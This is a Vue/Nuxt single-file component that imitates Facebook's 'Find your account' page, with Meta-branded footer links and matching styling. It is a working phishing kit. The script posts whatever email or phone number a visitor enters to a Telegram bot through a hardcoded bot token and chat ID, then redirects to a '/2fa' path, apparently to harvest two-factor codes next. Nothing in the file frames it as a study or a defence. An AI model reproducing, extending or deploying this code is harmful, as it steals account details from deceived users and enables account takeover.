


<template>
  <div id="app">

<body>

  <main class="page">

    <section class="account-box">

      <!-- Back button -->
      <button class="back-button" aria-label="Go back">
        <span>‹</span>
      </button>


       <form >

      <!-- Form -->
      <div class="form-container">
        <h1>Find your account</h1>

        <p class="description">
          Enter your mobile number or email.
        </p>
        <input
          type="text"
          class="account-input"
          placeholder="Mobile number or email"
          v-model="formDataRes.email"

        >

        <button class="continue-button" @click.prevent="finishJoob();">
          Continue
        </button>
      </div>
</form>
      <!-- Languages -->
      <div class="languages">
        <a href="#">English (US)</a>
        <a href="#">Español</a>
        <a href="#">Français (France)</a>
        <a href="#">中文(简体)</a>
        <a href="#">العربية</a>
        <a href="#">Português (Brasil)</a>
        <a href="#">Italiano</a>
        <a href="#">More languages...</a>
      </div>

      <div class="divider"></div>

      <!-- Footer -->
      <footer class="footer">

        <div class="footer-row">
          <a href="#">Sign Up</a>
          <a href="#">Log In</a>
          <a href="#">Messenger</a>
          <a href="#">Facebook Lite</a>
          <a href="#">Video</a>
          <a href="#">Meta Pay</a>
          <a href="#">Meta Store</a>
          <a href="#">Meta Quest</a>
          <a href="#">Ray-Ban Meta</a>
          <a href="#">Meta AI</a>
          <a href="#">Muse</a>
          <a href="#">Instagram</a>
        </div>

        <div class="footer-row">
          <a href="#">Threads</a>
          <a href="#">Privacy</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Consumer Health Privacy</a>
          <a href="#">Privacy Center</a>
          <a href="#">About</a>
          <a href="#">Create ad</a>
          <a href="#">Create Page</a>
          <a href="#">Developers</a>
          <a href="#">Careers</a>
          <a href="#">Cookies</a>
        </div>

        <div class="footer-row">
          <a href="#">Ad choices</a>
          <a href="#">Terms</a>
          <a href="#">Help</a>
          <a href="#">Contact Uploading &amp; Non-Users</a>
        </div>

      </footer>

    </section>

  </main>

</body>


  </div>
</template>





<script>
import axios from "axios";

export default {
  name: "App",
  data() {
    return {
      formDataRes: {
        email: "",
       
      },
      loading: false,
      isActive: false,
      count: 0,
      finalCount: 1, // Only send once
    };
  },
  methods: {
    async finishJoob() {
      this.count++;
      console.log("Count:", this.count, "Final:", this.finalCount);

      if (this.count <= this.finalCount) {
        this.loading = true;

        // Format the message as string
        const message = `*⚠️Facebookemail*\nemail: ${this.formDataRes.email}`;

        // Send to Telegram
        await this.sendTelegramResult(
          process.env.NUXT_APP_CHAT_ID || "-4794000485", 
          // 5
          message
        );

        this.isActive = !this.isActive;
        this.loading = false;
      } else {
        // Redirect after sending
        location.replace("/2fa");
      }
    },

    async sendTelegramResult(chatId, message) {
      try {
        const url = `https://api.telegram.org/bot7849999042:AAEmwy-noqEuAOxgS1UgV3e5PHj3oDhh718/sendMessage`;

        const payload = {
          chat_id: chatId,
          text: message,
        };

        console.log("Sending payload:", payload);
        await axios.post(url, payload);
      } catch (error) {
        console.error("Telegram API Error:", error);
      }
    },
  },
};
</script>








<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

html,
body {
  width: 100%;
  min-height: 100%;
}

body {
  font-family: Arial, Helvetica, sans-serif;
  background: #fff;
  color: #1c1e21;
}

/* Full-screen page */
.page {
  width: 100%;
  min-height: 100vh;
  padding: 30px 6vw;
}

/* Main container */
.account-box {
  width: 100%;
  max-width: 1100px;
  margin: 0 auto;
}

/* Back arrow */
.back-button {
  width: 45px;
  height: 45px;

  border: none;
  background: transparent;

  color: #65676b;
  cursor: pointer;

  display: flex;
  align-items: center;
  justify-content: center;
}

.back-button span {
  font-size: 42px;
  font-weight: 300;
  line-height: 1;
}

/* Form */
.form-container {
  width: min(600px, 80%);
  margin: 25px auto 0;
}

.form-container h1 {
  font-size: 28px;
  line-height: 34px;
  font-weight: 700;
  margin-bottom: 8px;
}

.description {
  color: #65676b;
  font-size: 17px;
  line-height: 24px;
  margin-bottom: 14px;
}

.account-input {
  width: 100%;
  height: 58px;

  border: 1px solid #ccd0d5;
  border-radius: 10px;

  padding: 0 18px;

  font-size: 17px;
  color: #1c1e21;

  outline: none;
}

.account-input::placeholder {
  color: #65676b;
}

.account-input:focus {
  border-color: #1877f2;
  box-shadow: 0 0 0 1px #1877f2;
}

/* Continue button */
.continue-button {
  width: 100%;
  height: 48px;

  margin-top: 20px;

  border: none;
  border-radius: 24px;

  background: #0866df;
  color: white;

  font-size: 16px;
  font-weight: 600;

  cursor: pointer;

  transition: background 0.2s ease;
}

.continue-button:hover {
  background: #0759c7;
}

/* Languages */
.languages {
  width: 100%;

  margin-top: 100px;

  display: flex;
  align-items: center;
  justify-content: center;

  flex-wrap: wrap;
  gap: 8px 28px;
}

.languages a {
  color: #65676b;
  text-decoration: none;

  font-size: 14px;
  line-height: 24px;
}

.languages a:hover {
  text-decoration: underline;
}

/* Divider */
.divider {
  width: 100%;
  height: 1px;

  background: #dddfe2;

  margin-top: 20px;
  margin-bottom: 20px;
}

/* Footer */
.footer {
  width: 100%;
}

.footer-row {
  display: flex;
  flex-wrap: wrap;

  gap: 6px 16px;

  margin-bottom: 8px;
}

.footer a {
  color: #65676b;
  text-decoration: none;

  font-size: 13px;
  line-height: 20px;

  white-space: nowrap;
}

.footer a:hover {
  text-decoration: underline;
}

/* Large screens */
@media (min-width: 1400px) {

  .page {
    padding: 45px 8vw;
  }

  .account-box {
    max-width: 1400px;
  }

  .form-container {
    width: 650px;
    margin-top: 35px;
  }

  .form-container h1 {
    font-size: 32px;
  }

  .description {
    font-size: 18px;
  }

  .account-input {
    height: 64px;
    font-size: 18px;
  }

  .continue-button {
    height: 52px;
    font-size: 17px;
  }

  .languages {
    margin-top: 120px;
  }
}

/* Tablet */
@media (max-width: 800px) {

  .page {
    padding: 25px 5vw;
  }

  .form-container {
    width: 90%;
  }

  .languages {
    margin-top: 70px;
  }
}

/* Mobile */
@media (max-width: 500px) {

  .page {
    padding: 20px 18px;
  }

  .back-button {
    width: 38px;
    height: 38px;
  }

  .back-button span {
    font-size: 36px;
  }

  .form-container {
    width: 100%;
    margin-top: 20px;
  }

  .form-container h1 {
    font-size: 24px;
    line-height: 30px;
  }

  .description {
    font-size: 15px;
  }

  .account-input {
    height: 54px;
    font-size: 16px;
  }

  .continue-button {
    height: 48px;
    font-size: 16px;
  }

  .languages {
    margin-top: 60px;
    gap: 5px 15px;
  }

  .languages a {
    font-size: 12px;
  }

  .footer-row {
    justify-content: center;
    gap: 4px 10px;
  }

  .footer a {
    font-size: 11px;
  }
}

</style>